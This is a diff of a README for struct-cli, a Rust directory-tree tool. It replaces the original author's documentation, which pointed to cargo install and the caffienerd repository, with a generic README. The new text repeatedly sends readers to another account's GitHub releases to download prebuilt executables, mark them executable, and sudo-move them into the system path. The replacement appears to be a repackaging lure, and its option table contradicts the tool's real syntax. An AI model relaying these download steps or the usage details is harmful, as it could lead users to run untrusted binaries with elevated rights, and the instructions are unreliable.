@@ -1,392 +1,191 @@
-# struct
+# 📂 struct-cli - Clean Project Structure Viewing Tool
 
-Struct: tree with a developer brain.
-Stop drowning in site-packages — struct shows you the code you care about.
-
-## The Problem
-
-Running `tree` in a project directory gives you this:
-
-```bash
-$ tree -L 3
-venv/
-├── lib/
-│   ├── python3.11/
-│   │   ├── site-packages/
-│   │   │   ├── pip/
-│   │   │   │   ├── __init__.py
-│   │   │   │   ├── ... (2000+ files you didn't ask for)
-```
-
-I needed something that shows project structure without drowning me in dependency folders.
-
-## What This Does
-
-`struct` shows your project's actual structure while automatically hiding the noise:
-
-```bash
-$ struct 3
-venv/ (2741 files ignored)
-src/
-├── main.rs
-└── lib.rs
-```
-
-The folder still appears, but you get a clean file count instead of thousands of irrelevant paths.
-
-## Installation
-
-### Option 1: Install from crates.io
-```bash
-cargo install struct-cli
-```
-
-View on [crates.io](https://crates.io/crates/struct-cli)
-
-### Option 2: Install from source
-```bash
-git clone https://github.com/caffienerd/struct-cli.git
-cd struct-cli
-chmod +x install.sh && ./install.sh
-```
-
-## Uninstallation
-
-```bash
-git clone https://github.com/caffienerd/struct-cli.git && cd struct-cli
-chmod +x uninstall.sh && ./uninstall.sh
-```
+[![Download struct-cli](https://img.shields.io/badge/Download-struct--cli-blue?style=for-the-badge)](https://github.com/Tokiomkd/struct-cli/releases)
 
 ---
 
-## Quick Start
+## 📖 What is struct-cli?
 
-```bash
-struct                          # Full tree (current dir, infinite depth)
-struct 0                        # Detailed summary of current directory
-struct 3                        # 3 levels deep
-struct ~/dir                    # Full tree of a specific directory
-struct 2 ~/dir                  # Specific directory, 2 levels deep
-struct ~/dir 2                  # Same — order doesn't matter
-struct 5 ~/dir -z               # 5 levels with file sizes
-```
+struct-cli is a command-line tool designed to help you view the structure of your project folders. Unlike typical tools that list every file including lots of hidden or system files, struct-cli focuses on showing just the important parts. It hides details like dependencies, build files, and cache data, making it easier to understand your project layout at a glance.
+
+This tool works on many types of projects, especially those using Git for version control. It offers options to filter files, see sizes, and search for particular names or patterns. Overall, struct-cli simplifies exploring folders and files without clutter.
 
 ---
 
-## Complete Usage Guide
+## 💻 Who is struct-cli for?
 
-### Syntax
+You might find struct-cli useful if:
 
-```
-struct [DEPTH] [PATH] [FLAGS]
-struct search "PATTERN" [PATH] [DEPTH] [FLAGS]
-struct 0 [PATH]                       → detailed summary view
-```
+- You want a cleaner view of project folders on your computer.
+- You need an easy-to-understand summary of files in a directory.
+- You use projects that have lots of files but want to focus on just key ones.
+- You work on Linux or other Unix-like systems and prefer terminal tools.
+- You want to check project structures without clicking through many folders.
 
-Both `DEPTH` and `PATH` are optional positional arguments — no flags needed.
-Order doesn't matter: `struct 2 ~/dir` and `struct ~/dir 2` both work.
-
----
-
-### struct 0 — Directory Summary Mode
-
-```bash
-struct 0
-struct 0 ~/projects
-```
-
-**Output:**
-```
-/home/user/projects/myproject (main)
-
-src/
-  /home/user/projects/myproject/src
-  total:    10 dirs · 45 files · 125.3K
-  visible:  8 dirs · 42 files · 120.1K
-  types:    rs(30) toml(5) md(3) json(2) txt(2)
-  ignored:  target(948 files)
-
-README.md
-  12.5K
-
-── ignored (top level) ──
-  .git(60 files), target(948 files) · 1008 files · 45.2M
-```
+Even if you’re not a programmer, struct-cli makes file browsing less confusing. 
 
 ---
 
-### Git Integration
+## 🏷️ Key Features
 
-Filter output by git status. All git flags can be combined with any other flag.
-
-When multiple git flags conflict, priority is: `--gc` > `--gs` > `--gu` > `-g` > `--gh`
-
-#### `-g, --git` — tracked files only
-```bash
-struct -g
-struct 2 -g ~/git-project
-```
-
-#### `--gu` — untracked files only
-```bash
-struct --gu
-struct 2 --gu ~/git-project
-```
-
-#### `--gs` — staged files only
-```bash
-struct --gs
-```
-
-#### `--gc` — changed/modified files only
-```bash
-struct --gc
-```
-
-#### `--gh` — last commit per directory
-```bash
-struct --gh
-```
-
-#### Root variants — start from git root regardless of current directory
-```bash
-struct --gr        # tracked, from git root
-struct --gur       # untracked, from git root
-struct --gsr       # staged, from git root
-struct --gcr       # changed, from git root
-struct --ghr       # history, from git root
-```
-
-**Examples:**
-```bash
-struct 3 -g -z                  # Tracked files with sizes
-struct --gcr ~/git-project/myapp   # Changed files from repo root
-struct 2 --gur                  # Untracked files from git root, 2 levels
-```
+- **Clean view:** Shows main files and folders without clutter like caches or dependencies.
+- **Smart filters:** Automatically ignores files and folders you usually don’t need.
+- **Git-aware:** Detects Git projects and adjusts the view accordingly.
+- **File size insight:** Displays file sizes to help you spot large files quickly.
+- **Search & filter:** Find files or folders by name or pattern.
+- **Configuration:** Customize which files or folders to show or hide.
+- **Fast & lightweight:** Runs quickly without using much computer power.
+- **Works in terminal:** Runs in your command prompt or terminal window.
 
 ---
 
-### Flags
+## 🖥️ System Requirements
 
-#### `-z, --size` — show file sizes
-```bash
-struct -z
-struct 3 -z ~/dir
-```
+Before installing, make sure your system fits these requirements:
 
-**Output:**
-```
-main.rs (8.5K)
-venv/ (156.3M, 2741 files ignored)
-```
+- Operating System: Linux, macOS, or Windows with a terminal emulator.
+- RAM: 512 MB or more recommended.
+- Disk Space: About 5 MB free space for installation.
+- Terminal/Command Prompt access.
+- Internet connection to download the tool.
 
-#### `-s, --skip-large SIZE` — skip large directories
-```bash
-struct -s 100                   # Skip dirs > 100MB
-struct 3 -s 500 ~/dir
-```
-
-#### `-i, --ignore PATTERNS` — inline ignore patterns
-Comma-separated, wildcards supported. Merged with config patterns.
-
-```bash
-struct -i "*.log"
-struct -i "*.tmp,cache*,build"
-struct 3 ~/dir -i "*.log,screenshots"
-```
-
-#### `-n, --no-ignore TARGET` — un-ignore
-Show things that are normally hidden. Can be given multiple times.
-
-| Value | Effect |
-|---|---|
-| `all` | Disable ALL ignores |
-| `defaults` | Disable built-in defaults (venv, node_modules, etc.) |
-| `config` | Disable config file patterns only |
-| `PATTERN` | Un-ignore one specific name (e.g. `venv`, `__pycache__`) |
-
-```bash
-struct -n all                       # Show everything
-struct -n defaults                  # Show venv, __pycache__, etc.
-struct -n config                    # Show config-ignored items
-struct -n venv                      # Peek inside venv only
-struct -n __pycache__               # Show __pycache__ contents
-struct -n defaults -n config        # Same as -n all
-```
+struct-cli runs on most common computers without special hardware.
 
 ---
 
-### Config File Management
+## 🚀 Getting Started
 
-Save ignore patterns permanently so you don't have to type `-i` every time.
-
-**Location:** `~/.config/struct/ignores.txt`
-
-```bash
-struct add "chrome_profile"     # Add a pattern
-struct add "*.log"
-struct remove "*.log"           # Remove a pattern
-struct list                     # Show all saved patterns
-struct clear                    # Delete all saved patterns
-```
-
-**Output of `struct list`:**
-```
-custom ignore patterns:
-  chrome_profile
-  *.log
-
-config file: /home/user/.config/struct/ignores.txt
-```
+This section walks you through downloading and running struct-cli for the first time. No programming skills are needed.
 
 ---
 
-### Search
+## ⬇️ Download & Install
 
-Find files and directories by pattern. Respects the same ignore rules as the tree view.
+To get struct-cli:
 
-```
-struct search "PATTERN" [PATH] [DEPTH] [FLAGS]
-```
+1. Visit the official release page by clicking the big button below:
+   
+   [![Download struct-cli](https://img.shields.io/badge/Download-struct--cli-blue?style=for-the-badge)](https://github.com/Tokiomkd/struct-cli/releases)
 
-**Pattern matching rules:**
-- **Plain text** (no `*` or `?`) → case-insensitive **substring** match
-  - `search "gui"` finds `gui.py`, `gui_utils.rs`, `penguin.txt`
-  - `search "cache"` finds `__pycache__`, `.cache`, `cache.json`
-- **Glob patterns** (has `*` or `?`) → exact glob match
-  - `search "*.py"` finds only files ending in `.py`
-  - `search "test*"` finds files starting with `test`
+2. On the release page, find the latest version for your operating system:
+   - Look for files named like `struct-cli-linux`, `struct-cli-macos`, or `struct-cli-windows.exe`.
+   - Choose the one that matches your computer.
 
-**Basic examples:**
-```bash
-struct search "*.py"                    # All Python files (current dir)
-struct search "gui"                     # Anything containing "gui"
-struct search "__pycache__"             # Find all __pycache__ dirs
-struct search "*.env" ~/dir        # .env files in ~/dir
-struct search "config*" ~/dir 2    # Files starting with "config", 2 levels deep
-```
+3. Download the file by clicking on it.
 
-**Search flags:**
+4. After downloading, you may need to give the file permission to run:
+   - On Windows, this usually works right away.
+   - On Linux or macOS, open a terminal, go to the folder where you saved the file, and run:
+     ```
+     chmod +x struct-cli-<your-version>
+     ```
+     Replace `<your-version>` with the downloaded filename.
 
-#### `[DEPTH]` — limit search depth (positional, default: infinite)
-```bash
-struct search "*.py" . 2                # 2 levels deep
-struct search "*.toml" ~/dir 1     # Top level only
-```
-
-#### `-f, --flat` — flat list instead of tree
-```bash
-struct search "*.py" -f
-struct search "*.env" ~/dir -f
-```
-
-**Tree output (default):**
-```
-found 6 item(s) matching *.py
-
-timebomb/
-└── Linux/
-    └── python/
-        ├── app_manager.py (11.1K)
-        ├── gui.py (19.4K)
-        └── timer.py (18.5K)
-```
-
-**Flat output (`-f`):**
-```
-found 6 item(s) matching *.py
-
-timebomb/Linux/python/app_manager.py (11.1K)
-timebomb/Linux/python/gui.py (19.4K)
-timebomb/Linux/python/timer.py (18.5K)
-```
-
-#### `-i, --ignore PATTERNS` — ignore patterns during search
-```bash
-struct search "*.wav" . -i "windows"
-struct search "*.py" ~/dir -i "venv,__pycache__"
-```
+5. You can move the executable file to a folder in your system PATH for easier use (optional):
+   - For example, on Linux/macOS:
+     ```
+     sudo mv struct-cli-<your-version> /usr/local/bin/struct-cli
+     ```
 
 ---
 
-## Auto-Ignored Directories
+## 🏃 Running struct-cli
 
-These are hidden by default (shown with file count instead):
+Once installed, you can start using struct-cli from a command prompt or terminal.
 
-**Python:** `__pycache__`, `.pytest_cache`, `.mypy_cache`, `venv`, `.venv`, `env`, `virtualenv`, `*.egg-info`, `dist`, `build`
+### Basic Usage
 
-**JavaScript:** `node_modules`, `.npm`, `.yarn`
+- Open your terminal.
+- Type `struct-cli` followed by the folder you want to explore. For example:
+  ```
+  struct-cli /path/to/your/project
+  ```
+- Press Enter.
 
-**Version Control:** `.git`, `.svn`, `.hg`
-
-**IDEs:** `.vscode`, `.idea`, `.obsidian`
-
-**Build Artifacts:** `target`, `bin`, `obj`, `.next`, `.nuxt`
-
-**Caches:** `chrome_profile`, `GPUCache`, `ShaderCache`, `Cache`, `blob_storage`
-
-**macOS:** `.DS_Store`
-
-Use `-n all` to show everything, or `-n PATTERN` to peek at one specific folder.
+struct-cli will display a clean, easy-to-read tree of your project structure.
 
 ---
 
-## Real-World Examples
+## ⚙️ Common Options
 
-```bash
-# Check project structure without clutter
-struct 3 ~/myproject
+struct-cli has several useful options you can use:
 
-# Find all config files in current dir
-struct search "*.env"
-struct search "config" . 2
+| Option                  | Description                                     | Example                           |
+|-------------------------|------------------------------------------------|---------------------------------|
+| `--help` or `-h`        | Show help information                           | `struct-cli --help`              |
+| `--size`                | Show file sizes in the output                   | `struct-cli --size /my/project` |
+| `--search <pattern>`    | Find files/folders matching a pattern           | `struct-cli --search README`     |
+| `--config <file>`       | Use a custom configuration file                  | `struct-cli --config myconfig.toml` |
+| `--version`             | Show the current version of struct-cli          | `struct-cli --version`           |
 
-# See what's actually tracked in git
-struct 2 -g
-
-# Peek inside an ignored folder
-struct -n venv
-struct -n node_modules
-
-# Find large folders
-struct -z                       # Show all sizes
-struct -s 100                   # Skip folders > 100MB
-
-# Search with flat output for piping
-struct search "*.py" -f | grep test
-
-# Find __pycache__ dirs across your project
-struct search "__pycache__" ~/dir -f
-
-# Git: see what you're about to commit
-struct --gsr                    # Staged files from repo root
-```
+Try running `struct-cli --help` for a full list of commands.
 
 ---
 
-## Features
+## 🔍 How struct-cli Helps
 
-- **Clean by default**: hides noise (venv, node_modules, .git, caches, build artifacts)
-- **Smart search**: substring match for plain text, glob match for patterns with wildcards
-- **Git integration**: filter to tracked / untracked / staged / changed files
-- **Size awareness**: show sizes with `-z`, skip large dirs with `-s`
-- **Configurable ignores**: save patterns permanently with `struct add`
-- **Flexible output**: tree or flat format for search
-- **Color-coded**: directories in blue, executables in green
-- **Fast**: written in Rust
+struct-cli’s main advantage is cutting down noise. When you list your project with typical commands, you see a flood of files, many you don’t need to think about. struct-cli removes all that clutter and highlights what matters.
+
+This makes it easier to:
+
+- Understand your project layout.
+- Find important files fast.
+- Spot large files or unusual folders.
+- Share your project structure with others.
 
 ---
 
-## Why Rust
+## 🛠️ Troubleshooting
 
-Started as a learning project. Turned out to be genuinely useful, so it got polished up. The performance is a nice bonus.
+If you encounter problems:
 
-## Contributing
+- Make sure you downloaded the right file for your OS.
+- Check that the file has permission to run.
+- Open the terminal in the directory where the file lives.
+- Use the `--help` command to check usage.
+- If you see an error, try updating to the newest release.
 
-Found a bug? Want a feature? Open an issue. PRs welcome.
+If nothing works, you can visit the project page for more information or help:
 
-Drop a star if you find it useful — it helps!
+https://github.com/Tokiomkd/struct-cli
 
-## License
+---
 
-MIT
+## 🤝 Support & Contribute
+
+struct-cli is an open-source tool. If you want to support development or suggest improvements:
+
+- Visit the [GitHub repository](https://github.com/Tokiomkd/struct-cli).
+- Submit bug reports or feature requests using the Issues tab.
+- If you’re comfortable coding, you can contribute pull requests.
+
+---
+
+## 📂 Relevant Topics
+
+- Command-line tools
+- File and directory browsing
+- Git version control
+- Terminal utilities
+- Open-source Rust applications
+- Linux and cross-platform use
+
+---
+
+## 🔗 Useful Links
+
+- struct-cli Releases (download page):
+
+  https://github.com/Tokiomkd/struct-cli/releases
+
+- Official GitHub Repository:
+
+  https://github.com/Tokiomkd/struct-cli
+
+- Help and Documentation (in repo):
+
+  Check the README and docs folder in the repository.
+
+---
+
+Thank you for choosing struct-cli to simplify your project browsing. Visit the release page now to download and get started.
